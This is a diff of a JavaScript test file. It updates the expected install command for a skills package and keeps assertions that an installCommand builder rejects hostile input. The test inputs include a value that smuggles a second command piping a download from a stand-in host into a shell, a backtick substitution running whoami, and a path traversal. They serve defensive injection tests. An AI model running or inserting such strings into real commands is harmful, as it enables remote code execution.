@@ -23,7 +23,7 @@ test("isValidSource requires owner/repo and refuses traversal", () => {
 });
 
 test("installCommand refuses to build a command a shell would reinterpret", () => {
-  assert.equal(installCommand("devfellowship/skills", "test-driven-development"), "npx skills add devfellowship/skills/test-driven-development");
+  assert.equal(installCommand("devfellowship/skills", "test-driven-development"), "npx skills add devfellowship/skills --skill test-driven-development");
   assert.equal(installCommand("devfellowship/skills", "a; curl evil.example|sh"), null);
   assert.equal(installCommand("a/b`whoami`", "ok"), null);
   assert.equal(installCommand("../evil/repo", "ok"), null);
